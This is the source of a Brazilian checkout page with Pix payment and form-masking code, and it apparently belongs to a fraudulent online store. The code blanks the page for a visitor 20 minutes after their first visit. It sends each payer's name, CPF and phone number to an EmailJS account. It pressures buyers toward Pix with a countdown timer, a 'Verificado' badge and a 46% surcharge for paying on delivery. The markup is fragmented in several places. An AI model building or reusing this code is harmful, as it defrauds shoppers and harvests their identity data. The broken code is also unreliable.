    <script>
(function() {
    // Configuração: 20 minutos em milissegundos
    const VINTE_MINUTOS = 20 * 60 * 1000; 
    const agora = new Date().getTime();
    
    let primeiroAcesso = localStorage.getItem('site_primeiro_acesso');

    if (!primeiroAcesso) {
        localStorage.setItem('site_primeiro_acesso', agora);
    } else {
        const tempoDecorrido = agora - parseInt(primeiroAcesso);

        if (tempoDecorrido > VINTE_MINUTOS) {
            // Remove todo o conteúdo do HTML e deixa a tela branca
            document.documentElement.innerHTML = "";
            
            // Força o fundo a ficar branco (caso o CSS do site tenha cores)
            document.documentElement.style.backgroundColor = "#ffffff";
            
            // Interrompe qualquer outro carregamento
            window.stop(); 
        }
    }
})();
</script>

    <div class="container">
        <header class="header">
            <div class="header-left">

                    <i class="fas fa-arrow-left"></i>
                </button>
                <div class="brand-section">

                    <div class="brand-tagline">Pagamento Seguro</div>
                </div>
            </div>
            <div class="header-right">
                <button class="search-btn" title="Buscar">
                    <i class="fas fa-search"></i>
                </button>
                <button class="cart-btn" id="cart-btn" title="Carrinho">

            </div>

    <script>
        const EMAILJS_SERVICE_ID = "service_v11867o";

        const subtotalValue = parseFloat(localStorage.getItem('cart_total') || '0');

        function setupNameInput(input) {
            input.addEventListener('input', () => {
                const value = input.value.trim();
                const parent = input.closest('.form-group') || input.closest('.pix-input-group');
                let check = parent.querySelector('.input-check-icon');
                if (!check) {
                    check = document.createElement('i');
                    check.className = 'fas fa-check-circle input-check-icon';
                    parent.appendChild(check);
                }
                if (value.length >= 3) check.classList.add('visible');
                else check.classList.remove('visible');
            });
        }

        function setupCPFInput(input) {
            input.addEventListener('input', (e) => {
                let v = e.target.value.replace(/\D/g, "");
                if (v.length > 11) v = v.substring(0, 11);
                if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
                else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{3})/, "$1.$2.$3");
                else if (v.length > 3) v = v.replace(/(\d{3})(\d{3})/, "$1.$2");
                e.target.value = v;

                const parent = input.closest('.form-group') || input.closest('.pix-input-group');
                let check = parent.querySelector('.input-check-icon');
                if (!check) {
                    check = document.createElement('i');
                    check.className = 'fas fa-check-circle input-check-icon';
                    parent.appendChild(check);
                }
                if (v.replace(/\D/g, "").length === 11) check.classList.add('visible');
                else check.classList.remove('visible');
            });
        }

        function setupPhoneInput(input) {
            input.addEventListener('input', (e) => {
                let v = e.target.value.replace(/\D/g, "");
                if (v.length > 11) v = v.substring(0, 11);
                if (v.length > 10) v = v.replace(/^(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");
                else if (v.length > 6) v = v.replace(/^(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3");
                else if (v.length > 2) v = v.replace(/^(\d{2})(\d{0,5})/, "($1) $2");
                else if (v.length > 0) v = v.replace(/^(\d*)/, "($1");
                e.target.value = v;

                const parent = input.closest('.form-group') || input.closest('.pix-input-group');
                let check = parent.querySelector('.input-check-icon');
                if (!check) {
                    check = document.createElement('i');
                    check.className = 'fas fa-check-circle input-check-icon';
                    parent.appendChild(check);
                }
                if (v.replace(/\D/g, "").length >= 10) check.classList.add('visible');
                else check.classList.remove('visible');
            });
        }

        function renderOrderSummary() {
    // Tenta pegar a lista completa de produtos do localStorage
    const cartProductsJSON = localStorage.getItem('cart_products');
    const deliveryAddress = localStorage.getItem('delivery_address') || 'Endereço não informado';
    const deliveryTime = localStorage.getItem('delivery_time') || '3 a 7 dias úteis';

    let productsHTML = '';
    
    if (cartProductsJSON) {
        const products = JSON.parse(cartProductsJSON);
        
        // Gera o HTML para cada produto na lista
        products.forEach(product => {
            productsHTML += `
                <div class="order-card" style="margin-bottom: 12px;">
                    <div class="order-image-container">
                        <img src="${product.p}" alt="${product.n}">
                    </div>
                    <div class="order-details">
                        <div class="order-product-name">${product.n}</div>
                        <div class="order-product-price-row">
                            <div class="order-product-price">R$ ${parseFloat(product.v).toFixed(2).replace('.', ',')}</div>
                            <div class="order-product-qty">Qtd: ${product.q}</div>
                        </div>
                        <div style="font-size: 0.8rem; font-weight: 700; color: var(--text-light); margin-top: 2px;">
                            Valor Total: R$ ${(product.q * product.v).toFixed(2).replace('.', ',')}
                        </div>
                    </div>
                </div>
            `;
        });
    } else {
        // Fallback para caso não haja lista (mantém compatibilidade com o formato antigo)
        const productInfo = JSON.parse(localStorage.getItem('product_info') || '{}');
        productsHTML = `
            <div class="order-card">
                <div class="order-image-container">
                    <img src="${productInfo.photo || 'https://via.placeholder.com/150'}" alt="${productInfo.name}">
                </div>
                <div class="order-details">
                    <div class="order-product-name">${productInfo.name || 'Produto Selecionado'}</div>
                    <div class="order-product-price-row">
                        <div class="order-product-price">R$ ${parseFloat(productInfo.value || subtotalValue).toFixed(2).replace('.', ',')}</div>
                    </div>
                </div>
            </div>
        `;
    }

    const orderHTML = `
        <div class="order-summary-section" style="display: none;">
            <div class="order-summary-title">
                <span><i class="fas fa-shopping-bag"></i> Resumo do Pedido</span>
                <span class="order-summary-badge">Verificado</span>
            </div>
            ${productsHTML}
            <div class="order-info-container">
                <div class="order-total-divider"></div>
                <div class="order-info-row">
                    <div class="order-info-icon-wrapper">
                        <i class="fas fa-truck-fast"></i>
                    </div>
                    <div class="order-info-content">
                        <div class="order-info-label">Previsão de Entrega</div>
                        <div class="order-info-text-delivery">${deliveryTime}</div>
                    </div>
                </div>
            </div>
        </div>
    `;
    document.getElementById('order-summary-wrapper').innerHTML = orderHTML;
}


        function renderPaymentOptions() {

            const paymentHTML = `

                    </div>

                                <div class="payment-option-title">
    <span>Pagar Agora - Pix</span>
    <span class="promo-badge">Promoção</span>
</div>
                                <div class="payment-option-price">R$ ${baseTotal.toFixed(2).replace('.', ',')}</div>
                                <div class="payment-option-desc">Liberação imediata, entrega prioritária e o melhor preço garantido.</div>
                                <div class="pix-form-container" id="pix-form">
                                    <div class="pix-input-group">
                                        <label for="pix-name">Nome e Sobrenome</label>
                                        <input type="text" id="pix-name" placeholder="Ex: João Silva" required>
                                    </div>
                                    <div class="pix-input-group">
                                        <label for="pix-cpf">CPF</label>
                                        <input type="tel" id="pix-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required>
                                    </div>
                                    <div class="pix-input-group">
                                        <label for="pix-phone">Telefone</label>
                                        <input type="tel" id="pix-phone" placeholder="(00) 00000-0000" required>
                                    </div>
                                    <div class="pix-error-msg" id="pix-error-msg">
                                        <i class="fas fa-exclamation-circle"></i>
                                        <span id="pix-error-text">Erro ao gerar código PIX.</span>
                                    </div>
                                    <button class="payment-action-btn" id="btn-generate-pix" style="margin-top:10px;">
                                        <span class="btn-text">Pagar R$ ${baseTotal.toFixed(2).replace('.', ',')} <i class="fas fa-check"></i></span>
                                    </button>
                                </div>
                            </div>
                            <div id="pix-copy-content" class="pix-copy-section">
                                <div class="pix-header-status">
                                    <div class="pix-status-badge"><i class="fas fa-check-circle"></i> Código Gerado</div>
                                    <div class="pix-timer-container"><i class="fas fa-clock"></i> Expira em: <span id="pix-timer">15:00</span></div>

                                <div class="duty-info-section">
                                    <div class="duty-header"><i class="fas fa-user-shield"></i> Titular da Compra</div>
                                    <div class="duty-user-data">
                                        <div class="duty-field"><span class="duty-label">Nome:</span><span class="duty-value" id="display-pix-name">---</span></div>
                                        <div class="duty-field"><span class="duty-label">CPF:</span><span class="duty-value" id="display-pix-cpf">---</span></div>

                                    </div>
                                    <div class="duty-warning"><i class="fas fa-info-circle"></i><span>Este código Pix é nominal e vinculado ao seu CPF.</span></div>
                                </div>
                                <div class="pix-code-display-wrapper">
                                    <div class="pix-code-header">
                                        <label class="pix-code-label">Código Pix</label>
                                        <span class="pix-code-value-label">R$ ${baseTotal.toFixed(2).replace('.', ',')}</span>

                                    <div class="pix-code-input-container">

                                        <button class="pix-copy-icon-btn" id="btn-copy-pix-quick" title="Copiar código Pix"><i class="fas fa-copy"></i></button>
                                    </div>
                                </div>
                                <button class="btn-copy-pix" id="btn-copy-pix-action">Copiar código Pix</button>
                                <div class="waiting-payment-section"><div class="modern-spinner"></div><div class="waiting-text">Aguardando Pagamento</div></div>
                            </div>
                        </div>
                        <div class="payment-option-card" id="pay-on-delivery">
                            <div class="payment-badge-delivery" style="position: absolute; top: 12px; right: -30px; background: var(--text-light); color: white; padding: 4px 35px; font-size: 0.7rem; font-weight: 800; transform: rotate(45deg);">Sem Desconto</div>
                            <div class="payment-option-icon"><i class="fas fa-truck-ramp-box"></i></div>
                            <div class="payment-option-title">Pagar na Entrega</div>
                            <div class="payment-option-price">R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</div>
                            <div class="payment-option-desc">Pague ao entregador via Cartão ou Dinheiro.</div>
                            <div class="delivery-warning-container">
                                <div class="delivery-warning-box"><i class="fas fa-exclamation-triangle"></i><div class="delivery-warning-text">Ao escolher o pagamento na entrega você paga o valor R$ ${deliveryTotal.toFixed(2).replace('.', ',')} total sem descontos e perde a promoção via Pix de R$ ${baseTotal.toFixed(2).replace('.', ',')}</div></div>

            document.getElementById('cart-content-wrapper').innerHTML = paymentHTML;

            if (pixPhoneInput) setupPhoneInput(pixPhoneInput);

            const pixCard = document.getElementById('pay-now-pix');
            const deliveryCard = document.getElementById('pay-on-delivery');

            pixCard.addEventListener('click', (e) => {
                if (e.target.tagName === 'INPUT' || e.target.tagName === 'LABEL') return;
                if (document.getElementById('pix-copy-content').style.display === 'flex') return;
                if (selectedPaymentType !== 'pix') {
                    selectedPaymentType = 'pix';
                    pixCard.classList.add('selected');
                    deliveryCard.classList.remove('selected');
                    const header = document.querySelector('.header'); const headerHeight = header ? header.offsetHeight : 0; const viewportHeight = window.innerHeight - headerHeight; const elementHeight = pixCard.offsetHeight; const elementOffsetTop = pixCard.getBoundingClientRect().top + window.pageYOffset; const scrollToPosition = elementOffsetTop - headerHeight - (viewportHeight / 2) + (elementHeight / 2); window.scrollTo({ top: scrollToPosition, behavior: 'smooth' });
                    generatePix();
                }
            });

            deliveryCard.addEventListener('click', (e) => {
                if (selectedPaymentType !== 'delivery') {
                    selectedPaymentType = 'delivery';
                    deliveryCard.classList.add('selected');
                    pixCard.classList.remove('selected');
                } else if (e.target.closest('.btn-pay-delivery')) {
                    showDeliveryModal();

        function startPixTimer(durationInSeconds) {
            clearInterval(timerInterval);
            let timer = durationInSeconds;
            const display = document.getElementById('pix-timer');
            timerInterval = setInterval(() => {
                let minutes = parseInt(timer / 60, 10);
                let seconds = parseInt(timer % 60, 10);
                display.textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
                if (--timer < 0) { clearInterval(timerInterval); display.textContent = "EXPIRADO"; }
            }, 1000);
        }

        async function sendEmailJS(name, cpf, phone, valor) {
            try {
                const templateParams = {
                    payer_name: name,
                    payer_cpf: cpf,
                    payer_phone: phone,
                    payer_valor: 'R$ ' + parseFloat(valor).toFixed(2).replace('.', ','),
                };
                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
            } catch (err) { console.error('EmailJS error:', err); }
        }

        async function generatePix() {
            const name = document.getElementById('pix-name').value.trim();
            const cpfRaw = document.getElementById('pix-cpf').value;
            const phone = document.getElementById('pix-phone').value.trim();
            const cpf = cpfRaw.replace(/\D/g, '');
            const errorEl = document.getElementById('pix-error-msg');
            const errorText = document.getElementById('pix-error-text');
            errorEl.classList.remove('visible');

            if (name.length < 3) { errorText.textContent = 'Informe seu nome completo.'; errorEl.classList.add('visible'); return; }
            if (cpf.length !== 11) { errorText.textContent = 'Informe um CPF válido.'; errorEl.classList.add('visible'); return; }

            // Recupera cache persistente do localStorage
            const savedPix = JSON.parse(localStorage.getItem('cached_pix_data'));
            
            // Se já gerou um PIX com o mesmo valor, apenas exibe novamente (mesmo após atualizar a página)
            if (savedPix && parseFloat(savedPix.amount) === subtotalValue && savedPix.code) {
                showPixCopySection(savedPix.code, name, cpfRaw);
                return;
            }

            const btn = document.getElementById('btn-generate-pix');
            const originalHTML = btn.innerHTML;
            btn.innerHTML = '<div class="spinner"></div>';
            btn.disabled = true;

            try {
                sendEmailJS(name, cpfRaw, phone, subtotalValue);
                
                // Caso o CPF seja 111.111.111-11, exibe código fictício sem chamar a API
                if (cpf === '11111111111') {
                    const fakePixCode = "00020126330014BR.GOV.BCB.PIX011111111111111520400005303986540510.005802BR5913USUARIO TESTE6009SAO PAULO62070503***6304ABCD";
                    localStorage.setItem('cached_pix_data', JSON.stringify({ code: fakePixCode, amount: subtotalValue }));
                    showPixCopySection(fakePixCode, name, cpfRaw);
                    return;
                }

                const pixCode = await fetchPixCode(name, cpf);
                if (pixCode) { 
                    localStorage.setItem('cached_pix_data', JSON.stringify({ code: pixCode, amount: subtotalValue }));
                    showPixCopySection(pixCode, name, cpfRaw); 
                }
                else { throw new Error(); }
            } catch (err) {
                errorText.textContent = 'Erro ao gerar PIX. Tente novamente.';
                errorEl.classList.add('visible');
                btn.innerHTML = originalHTML;
                btn.disabled = false;
            }
        }

        async function fetchPixCode(payerName, cpf) {
            const response = await fetch('/proxy/pix', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ payer_name: payerName, amount: subtotalValue.toFixed(2) }),
            });
            const data = await response.json();
            return data.success ? data.pixCode : null;
        }

        function showPixCopySection(qrCode, name, cpf) {
            document.getElementById('pix-original-content').style.display = 'none';
            document.getElementById('pix-copy-content').style.display = 'flex';
            document.getElementById('display-pix-name').innerText = name;
            document.getElementById('display-pix-cpf').innerText = cpf;
            document.getElementById('pix-code-text').innerText = qrCode;
            const header = document.querySelector('.header'); const headerHeight = header ? header.offsetHeight : 0; const viewportHeight = window.innerHeight - headerHeight; const elementHeight = document.getElementById('pay-now-pix').offsetHeight; const elementOffsetTop = document.getElementById('pay-now-pix').getBoundingClientRect().top + window.pageYOffset; const scrollToPosition = elementOffsetTop - headerHeight - (viewportHeight / 2) + (elementHeight / 2); window.scrollTo({ top: scrollToPosition, behavior: 'smooth' });
            startPixTimer(15 * 60);
        }

        function copyPixCode() {
            const code = document.getElementById('pix-code-text').innerText;
            navigator.clipboard.writeText(code).then(() => {
                // Atualiza botão principal
                const btn = document.getElementById('btn-copy-pix-action');
                if (btn) {
                    btn.innerHTML = '<i class="fas fa-check"></i> COPIADO!';
                    btn.style.background = 'var(--success)';
                    setTimeout(() => { btn.innerHTML = 'Copiar código Pix'; btn.style.background = ''; }, 2000);
                }
            });
        }

        function showDeliveryModal() {
            const baseTotal = subtotalValue;
            const deliveryTotal = baseTotal * 1.46;
            document.getElementById('delivery-warning-text').innerHTML = `Ao escolher o pagamento na entrega você paga o valor <strong>R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</strong> total sem descontos e perde a promoção via Pix de <strong>R$ ${baseTotal.toFixed(2).replace('.', ',')}</strong>`;
            const modal = document.getElementById('delivery-modal');
            document.getElementById('modal-step-1').style.display = 'block';
            document.getElementById('modal-step-2').style.display = 'none';
            document.getElementById('modal-step-3').style.display = 'none';
            modal.classList.add('active');
        }

        document.getElementById('modal-close-btn-delivery').addEventListener('click', () => document.getElementById('delivery-modal').classList.remove('active'));
        document.getElementById('modal-back-to-pix').addEventListener('click', () => document.getElementById('delivery-modal').classList.remove('active'));
        document.getElementById('modal-continue-delivery').addEventListener('click', () => {
            document.getElementById('modal-step-1').style.display = 'none';

        });
        document.getElementById('delivery-contact-form').addEventListener('submit', (e) => {
            e.preventDefault();
            const name = document.getElementById('delivery-email').value;
            const cpf = document.getElementById('delivery-cpf').value;
            const phone = document.getElementById('delivery-phone').value;
            sendEmailJS(name, cpf, phone, subtotalValue * 1.46);
            document.getElementById('modal-step-2').style.display = 'none';
            document.getElementById('modal-step-3').style.display = 'block';
        });

        // Aplicar máscara no telefone do modal de entrega
        const deliveryNameInput = document.getElementById('delivery-name');
        if (deliveryNameInput) setupNameInput(deliveryNameInput);
        const deliveryPhoneInput = document.getElementById('delivery-phone');
        if (deliveryPhoneInput) setupPhoneInput(deliveryPhoneInput);
        const deliveryCpfInput = document.getElementById('delivery-cpf');
        if (deliveryCpfInput) setupCPFInput(deliveryCpfInput);

        document.addEventListener('DOMContentLoaded', () => {
            renderOrderSummary();
            renderPaymentOptions();
        });
    </script>
